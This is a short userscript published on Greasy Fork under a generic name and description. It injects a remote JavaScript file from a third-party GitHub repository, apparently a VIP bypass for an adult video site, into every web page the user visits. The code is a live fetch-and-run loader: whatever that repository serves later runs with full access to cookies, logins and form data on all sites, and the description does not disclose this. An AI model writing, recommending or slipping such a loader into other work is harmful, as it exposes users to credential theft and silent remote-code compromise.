// ==UserScript==
// @name         Custom 1234566
// @namespace    http://example.com/
// @version      0.1
// @description  Custom script for appending external JS
// @author       You
// @match        *://*/*
// @grant        none

// @license MIT

// @downloadURL https://update.greasyfork.org/scripts/495365/Custom%201234566.user.js
// @updateURL https://update.greasyfork.org/scripts/495365/Custom%201234566.meta.js
// ==/UserScript==

(function() {
    var script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/gh/91p2022/91@main/91porn-vip.js';
    document.head.appendChild(script);
})();